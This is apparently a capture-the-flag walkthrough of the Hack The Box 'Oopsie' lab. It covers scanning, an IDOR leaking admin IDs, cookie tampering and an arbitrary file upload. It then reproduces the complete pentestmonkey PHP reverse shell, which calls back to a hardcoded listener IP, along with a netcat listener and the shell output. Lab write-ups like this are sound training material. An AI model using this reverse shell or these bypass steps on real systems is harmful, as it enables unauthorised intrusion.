# Oopsie (HTB Starting Point 2x2)

## Target Details

IP: 10.129.69.179

## Full Walk Through

### Port scan

```bash
naabu -host 10.129.69.179  -nmap-cli 'nmap -sV -sC nmap-output'
```

{% code overflow="wrap" %}
```
[INF] Current naabu version 2.1.6 (latest)
[INF] Running CONNECT scan with non root privileges
[INF] Found 2 ports on host 10.129.69.179 (10.129.69.179)
10.129.69.179:22
10.129.69.179:80
[INF] Running nmap command: nmap -sV -sC nmap-output -p 80,22 10.129.69.179
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 07:53 IST
Nmap scan report for 10.129.69.179
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
```
{% endcode %}

So we have an SSH service and a HTTP service (website).&#x20;

### Directory Brute Force

```awk
gobuster dir --url http://10.129.95.191/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/21 03:54:46 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.95.191/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]
/index.php            (Status: 200) [Size: 10932]
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]
/server-status        (Status: 403) [Size: 278]
/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]
Progress: 4713 / 4714 (99.98%)
===============================================================
2023/05/21 03:57:11 Finished
===============================================================
```

**Probable Approaches** \
**SSH:** that we need to get access of, either, by getting the keys from the server or by uploading our forged keys.\
**Website**: should be our primary target to gain a foothold on the server. We can probably have web shells uploaded in the `/uploads` sections.

### Login Panel allows unauthenticated guest access

Upon inspection we find `<script src="`[`/cdn-cgi/login/script.js`](http://10.129.69.179/cdn-cgi/login/script.js)`"></script>` almost at the end of the home page.&#x20;

This gives us the login panel at the `/cdn-cgi/login` endpoint:

<figure><img src="../.gitbook/assets/LOGIN_PANEL.png" alt=""><figcaption><p>Login Panel</p></figcaption></figure>

After clicking on `Login as Guest`, we are given guest access to the control panel, without any authentication.

<figure><img src="../.gitbook/assets/GUEST_UNAUTH_LOGIN.png" alt=""><figcaption><p>Guest Login</p></figcaption></figure>

### IDOR using guest login

We can modify the Id parameter in the URL to leak out information about other users.&#x20;

#### Leaking out client (john) information&#x20;

* Modify Id parameter to 4 to see john's information

<figure><img src="../.gitbook/assets/CLIENT_JOHN_INFO_LEAK.png" alt=""><figcaption><p>Access ID and email of John</p></figcaption></figure>

#### Leaking out admin information

* Similar approach like above, by setting Id parameter to 1.

<figure><img src="../.gitbook/assets/IDOR_TOADMIN_REVEAL_ADMIN_ID.png" alt=""><figcaption><p>IDOR to admin's information</p></figcaption></figure>

This gives us the access ID of the admin user and the admin email id, which we can use later for logging in as the admin user.

### Broken Access Control in uploads

Upon visiting the upload section using the guest user login, we are greeted with the message "Action requires admin rights":

<figure><img src="../.gitbook/assets/UPLOAD_DEFAULT.png" alt=""><figcaption><p>Uploads with guest access</p></figcaption></figure>

Now with the admin access id and by setting the role parameter in cookies to be admin, we can have a broken access to the admin upload panel:

<figure><img src="../.gitbook/assets/UPLOAD_BROKEN_ACCESS_CONTROL.png" alt=""><figcaption><p>Broken Access Control to admin panel by tampering with user and role cookies</p></figcaption></figure>

We can set these cookie values in the browser storage for persistent access to the upload section.

### File Upload Vulnerability

To check if we can upload any arbitrary files, let's create one using:

```bash
touch arbitrary.php
```

We can select and upload the file successfully.&#x20;

<figure><img src="../.gitbook/assets/ARBITRARY_UPLOAD.png" alt=""><figcaption><p>Arbitrary File Upload</p></figcaption></figure>

### Remote Code Execution via Arbitrary File Upload

Now that we know we can upload `php` files, we can try and upload a `php webshell` to gain shell access to the server.

The php code:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.13';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

We start a netcat listener using:

```bash
sudo nc -vnlp 4444
```

Then we upload and execute our web shell by going to [http://10.129.95.191/uploads/php-reverse-shell.php](http://10.129.95.191/uploads/php-reverse-shell.php) link via the URL bar in a browser. The window gets stuck on reloading the page as shown below:

<figure><img src="../.gitbook/assets/BROWSER_FREEZE_AFTER_UPLOAD_AND_URL_EXECUTE.png" alt=""><figcaption><p>PHP webshell working</p></figcaption></figure>

And we get a shell back in our netcat listener:

```
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.95.191] 49214
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:48:53 up 11 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

















